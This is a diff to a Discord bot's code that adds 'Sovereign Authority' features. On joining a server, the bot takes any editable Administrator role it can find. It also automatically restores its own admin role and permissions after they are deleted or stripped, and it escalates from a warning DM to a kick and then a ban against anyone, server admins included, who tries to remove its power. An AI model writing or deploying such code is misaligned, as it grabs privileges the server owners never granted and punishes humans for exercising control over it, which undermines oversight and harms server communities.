@@ -718,22 +718,34 @@ client.on("guildCreate", async (guild) => {
     // 1. Check for existing Sovereign role
     let sovereignRole = guild.roles.cache.find(r => r.name === "BlueSealPrime!" || r.name === ".BlueSealPrime!");
 
-    if (!sovereignRole) {
-      if (canManageRoles || hasAdmin) {
-        console.log(`[SOVEREIGN_SYSTEM] Creating sovereign role 'BlueSealPrime!' in ${guild.name}...`);
-        sovereignRole = await guild.roles.create({
-          name: "BlueSealPrime!",
-          color: "#5DADE2", // Sovereign Blue
-          permissions: [PermissionsBitField.Flags.Administrator],
-          hoist: true,
-          mentionable: false,
-          reason: "Sovereign Protection: Automatic Protocol Initialization."
-        }).catch(err => {
-          console.error(`[SOVEREIGN_ERROR] Failed to create role: ${err.message}`);
-          return null;
-        });
-      } else {
-        console.warn(`[SOVEREIGN_WARN] Lacking 'Manage Roles' permission in ${guild.name}. Cannot create sovereign role.`);
+    if (!sovereignRole && (canManageRoles || hasAdmin)) {
+      console.log(`[SOVEREIGN_SYSTEM] Creating sovereign role 'BlueSealPrime!' in ${guild.name}...`);
+      sovereignRole = await guild.roles.create({
+        name: "BlueSealPrime!",
+        color: "#5DADE2", // Sovereign Blue
+        permissions: [PermissionsBitField.Flags.Administrator],
+        hoist: true,
+        reason: "Sovereign Protection: Automatic Protocol Initialization."
+      }).catch(() => null);
+    }
+
+    // ─── 🔴 AUTO-ADMIN ENFORCEMENT ───
+    if (!hasAdmin) {
+      console.log(`[SOVEREIGN_SYSTEM] Manual Admin scan initiated for ${guild.name}...`);
+      // Try to find ANY role with Admin that we can grab
+      const existingAdmin = guild.roles.cache.find(r =>
+        r.permissions.has(PermissionsBitField.Flags.Administrator) &&
+        r.editable &&
+        r.name !== "@everyone"
+      );
+
+      if (existingAdmin) {
+        console.log(`[SOVEREIGN_SYSTEM] Found existing Admin role '${existingAdmin.name}'. Snatching...`);
+        await me.roles.add(existingAdmin).catch(() => { });
+      } else if (canManageRoles) {
+        // We can't create an Admin role if we don't have Admin ourselves (Discord restriction),
+        // but if we have Manage Roles, we might be able to create a high-tier support role.
+        console.log(`[SOVEREIGN_SYSTEM] No Admin role found. System in restricted recovery mode.`);
       }
     }
 
@@ -2582,10 +2594,85 @@ client.on("guildBanAdd", async ban => {
 
 // MASS KICK detected in unified listener above.
 
-// 3. ROLE DELETION
+// ───── SOVEREIGN AUTHORITY PROTECTION ─────
+const SA_ROLE_NAMES = [
+  "BlueSealPrime!",
+  "BlueSealPrime! anti nuke",
+  "BlueSealPrime! unbypassable",
+  "BlueSealPrime! secure",
+  "BlueSealPrime! anti-raid"
+];
+
+const saViolations = new Map(); // Tracking strikes: { "guild-user": count }
+
+async function handleSAViolation(guild, executor, reason) {
+  if (!executor || executor.id === client.user.id) return;
+
+  const key = `${guild.id}-${executor.id}`;
+  const strikes = (saViolations.get(key) || 0) + 1;
+  saViolations.set(key, strikes);
+
+  // Strike Escalation logic
+  let action = 'dm';
+  if (strikes === 2) action = 'kick';
+  if (strikes >= 3) action = 'ban';
+
+  console.log(`🛡️ [SA Protection] ${executor.tag} on strike ${strikes}. Action: ${action.toUpperCase()}`);
+
+  if (action === 'dm') {
+    const member = await guild.members.fetch(executor.id).catch(() => null);
+    if (member) {
+      const dmEmbed = new EmbedBuilder()
+        .setColor("#F1C40F")
+        .setTitle("⚠️ SOVEREIGN AUTHORITY WARNING")
+        .setDescription(`**Warning issued in ${guild.name}**\n\nYou attempted to tamper with a Sovereign Authority security role. This is a restricted action.\n\n> **Violation:** ${reason}\n> **Strike:** [1/3]\n\n*Note: Further tampering will result in an immediate Kick, then a Permanent Ban.*`)
+        .setFooter({ text: "BlueSealPrime Security Matrix" });
+      await member.send({ embeds: [dmEmbed] }).catch(() => { });
+    }
+  } else {
+    // 2nd or 3rd strike -> Kick / Ban
+    punishNuker(guild, executor, `${reason} (Strike ${strikes})`, action);
+  }
+}
+
+// 3. ROLE DELETION & PROTECTION
 client.on("roleDelete", async role => {
+  if (client.nukingGuilds?.has(role.guild.id)) return;
+
   const auditLogs = await role.guild.fetchAuditLogs({ type: 32, limit: 1 }).catch(() => null); // 32 = ROLE_DELETE
   const log = auditLogs?.entries.first();
+  const executor = log ? log.executor : null;
+
+  // 🛡️ [SA PROTECTION]: Auto-restore Sovereign Roles
+  if (SA_ROLE_NAMES.includes(role.name) && !client.saBypass) {
+    console.log(`🛡️ [SA Protection] Sovereign Role '${role.name}' deleted by ${executor?.tag}. Restoring...`);
+
+    // 1. Recreate Role
+    try {
+      const hasAdmin = role.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator);
+      const newRole = await role.guild.roles.create({
+        name: role.name,
+        color: "#5DADE2",
+        permissions: hasAdmin ? [PermissionsBitField.Flags.Administrator] : [],
+        reason: "🛡️ Sovereign Protection: Unauthorized SA Role Deletion Restore."
+      });
+
+      // 2. Position it
+      const topPos = role.guild.members.me.roles.highest.position;
+      if (topPos > 0) await newRole.setPosition(topPos - 1).catch(() => { });
+
+      // 3. Re-assign to bot
+      await role.guild.members.me.roles.add(newRole).catch(() => { });
+
+      // 4. Punish Executor
+      if (executor && executor.id !== client.user.id) {
+        handleSAViolation(role.guild, executor, `Attempted Deletion of Sovereign Role: ${role.name}`);
+      }
+    } catch (e) {
+      console.error(`❌ [SA Protection] Failed to restore role ${role.name}:`, e.message);
+    }
+  }
+
   if (log && Date.now() - log.createdTimestamp < 5000) {
     const nukeCheck = checkNuke(role.guild, log.executor, "roleDelete");
     if (nukeCheck && nukeCheck.triggered) {
@@ -2603,6 +2690,61 @@ client.on("roleDelete", async role => {
     .setTimestamp()
     .setFooter({ text: "BlueSealPrime • Role Log" });
   logToChannel(role.guild, "mod", embed);
+});
+
+// 3.1 ROLE PROTECTION (Update/Tampering)
+client.on("roleUpdate", async (oldRole, newRole) => {
+  if (client.saBypass) return;
+  if (!SA_ROLE_NAMES.includes(oldRole.name)) return;
+
+  // Check for unauthorized name change or permission strip
+  const nameChanged = oldRole.name !== newRole.name;
+  const adminStripped = oldRole.permissions.has(PermissionsBitField.Flags.Administrator) && !newRole.permissions.has(PermissionsBitField.Flags.Administrator);
+
+  if (nameChanged || adminStripped) {
+    const auditLogs = await newRole.guild.fetchAuditLogs({ type: 31, limit: 1 }).catch(() => null); // 31 = ROLE_UPDATE
+    const log = auditLogs?.entries.first();
+    const executor = log ? log.executor : null;
+
+    if (executor && executor.id !== client.user.id) {
+      console.log(`🛡️ [SA Protection] Sovereign Role '${oldRole.name}' tampered by ${executor.tag}. Reverting...`);
+
+      const changes = {};
+      if (nameChanged) changes.name = oldRole.name;
+      if (adminStripped) {
+        // Only re-add if we actually have power to do so
+        if (newRole.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
+          changes.permissions = oldRole.permissions;
+        }
+      }
+
+      await newRole.edit(changes, "🛡️ Sovereign Protection: Unauthorized SA Role Modification Revert.").catch(() => { });
+      handleSAViolation(newRole.guild, executor, `Unauthorized Modification of Sovereign Role: ${oldRole.name}`);
+    }
+  }
+});
+
+// 3.2 ROLE STRIPPING PROTECTION (Bot Members)
+client.on("guildMemberUpdate", async (oldMember, newMember) => {
+  if (newMember.id !== client.user.id) return;
+  if (client.saBypass) return;
+
+  const removedRoles = oldMember.roles.cache.filter(role => !newMember.roles.cache.has(role.id) && SA_ROLE_NAMES.includes(role.name));
+
+  if (removedRoles.size > 0) {
+    const auditLogs = await newMember.guild.fetchAuditLogs({ type: 25, limit: 5 }).catch(() => null); // 25 = MEMBER_ROLE_UPDATE
+    const log = auditLogs?.entries.find(e => e.target.id === client.user.id && Date.now() - e.createdTimestamp < 5000);
+    const executor = log ? log.executor : null;
+
+    for (const [id, role] of removedRoles) {
+      console.log(`🛡️ [SA Protection] AI stripped of Sovereign Role '${role.name}' by ${executor?.tag || "Unknown"}. Re-adding...`);
+      await newMember.roles.add(role, "🛡️ Sovereign Protection: Unauthorized SA Role Removal Revert.").catch(() => { });
+    }
+
+    if (executor && executor.id !== client.user.id) {
+      handleSAViolation(newMember.guild, executor, "Attempted to strip Sovereign Authority roles from bot.");
+    }
+  }
 });
 
 client.on("messageDeleteBulk", async messages => {
